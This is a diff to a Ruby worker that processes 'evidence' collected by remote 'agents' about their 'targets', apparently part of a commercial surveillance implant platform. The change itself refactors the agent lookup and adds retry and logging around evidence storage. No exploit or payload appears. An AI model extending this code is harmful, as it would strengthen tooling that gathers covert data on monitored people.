@@ -9,10 +9,12 @@ if File.directory?(Dir.pwd + '/lib/rcs-worker-release')
   require 'rcs-db-release/config'
   require 'rcs-db-release/db_layer'
   require 'rcs-db-release/grid'
+  require 'rcs-db-release/alert'
 else
   require 'rcs-db/config'
   require 'rcs-db/db_layer'
   require 'rcs-db/grid'
+  require 'rcs-db/alert'
 end
 
 require 'mongo'
@@ -32,24 +34,28 @@ class InstanceWorker
   include RCS::Tracer
   
   SLEEP_TIME = 10
+
+  def get_agent_target
+    @agent = Item.agents.where({ident: @ident, instance: @instance}).first
+    raise "Agent \'#{@ident}:#{@instance}\' cannot be found." if @agent.nil?
+    @target = @agent.get_parent
+  end
   
   def initialize(instance, ident)
+    @instance = instance
+    @ident = ident
     @evidences = []
     @state = :running
     @seconds_sleeping = 0
     @semaphore = Mutex.new
     
     # get info about the agent instance from evidence db
-    @agent = Item.agents.where({ident: ident, instance: instance}).first
-    raise "Agent \'#{ident}:#{instance}\' cannot be found." if @agent.nil?
-
-    @target = @agent.get_parent
+    get_agent_target
 
     trace :info, "Created processor for agent #{@agent['ident']}:#{@agent['instance']} (target #{@target['_id']})"
     
     # the log key is passed as a string taken from the db
     # we need to calculate the MD5 and use it in binary form
-    trace :debug, "Evidence key #{@agent['logkey']}"
     @key = Digest::MD5.digest @agent['logkey']
 
     @process = Proc.new do
@@ -121,12 +127,25 @@ class InstanceWorker
               ev[:type] = ev.type if ev.respond_to? :type
               ev_type = ev[:type]
 
-              case ev[:type]
+              processor = case ev[:type]
                 when :call
-                  @call_processor.feed(ev)
+                  @call_processor
                 else
-                  @single_processor.feed(ev)
+                  @single_processor
               end
+
+              begin
+                evidence = processor.feed ev
+                trace :debug, "EVIDENCE? #{evidence.inspect}"
+                #RCS::DB::Alerting.new_evidence evidence unless evidence.nil?
+              rescue Exception => e
+                trace :error, "[#{evidence_id}] cannot store evidence, #{e.message}"
+                trace :error, "[#{evidence_id}] #{e.backtrace}"
+                trace :debug, "[#{evidence_id}] refreshing agent and target information and retrying."
+                get_agent_target
+                retry if attempt ||= 0 and attempt += 1 and attempt < 3
+              end
+
             end
 
             processing_time = Time.now - start_time
